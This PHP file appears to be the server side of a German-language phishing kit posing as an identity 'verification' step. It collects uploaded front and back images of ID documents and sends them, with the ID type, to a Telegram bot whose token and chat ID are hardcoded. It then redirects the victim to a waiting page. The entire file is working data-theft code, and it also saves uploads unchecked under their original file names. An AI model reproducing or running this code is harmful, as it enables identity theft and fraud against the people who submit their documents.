<?php
require 'main.php';

// =========== CONFIG ============
$botToken = '7969086885:AAF5bCatx6cZ5orWJxRUHDl9IO7Dt1LRXfw'; // replace with your bot token
$chatId = '5462569944';     // replace with your chat ID
// ===============================

// === Helpers ===
function sendTelegramText($token, $chatId, $message) {
    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POSTFIELDS => $data,
        CURLOPT_POST => true,
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

function sendTelegramFile($token, $chatId, $filePath, $caption = '') {
    if (!file_exists($filePath)) return false;
    $url = "https://api.telegram.org/bot$token/sendDocument";
    $document = new CURLFile(realpath($filePath));
    $data = [
        'chat_id' => $chatId,
        'document' => $document,
        'caption' => $caption,
    ];
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $data,
    ]);
    $response = curl_exec($ch);
    curl_close($ch);
    return $response;
}

// === Main logic ===
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $idType = $_POST['id_type'] ?? 'Unbekannt';

    // Send message
    $message = "<b>Neue Verifizierung</b>\nAusweis: " . htmlspecialchars($idType);
    sendTelegramText($botToken, $chatId, $message);

    // Save uploaded files
    $uploadDir = __DIR__ . '/uploads/';
    if (!file_exists($uploadDir)) mkdir($uploadDir, 0775, true);

    if (isset($_FILES['img']) && $_FILES['img']['error'] === UPLOAD_ERR_OK) {
        $pathFront = $uploadDir . basename($_FILES['img']['name']);
        move_uploaded_file($_FILES['img']['tmp_name'], $pathFront);
        sendTelegramFile($botToken, $chatId, $pathFront, "Vorderseite");
    }

    if (isset($_FILES['img2']) && $_FILES['img2']['error'] === UPLOAD_ERR_OK) {
        $pathBack = $uploadDir . basename($_FILES['img2']['name']);
        move_uploaded_file($_FILES['img2']['tmp_name'], $pathBack);
        sendTelegramFile($botToken, $chatId, $pathBack, "Rückseite");
    }

    // Redirect
header("location: wait.php?next=done.php");
    exit();
} else {
    echo "Fehler: Keine POST-Anfrage.";
}
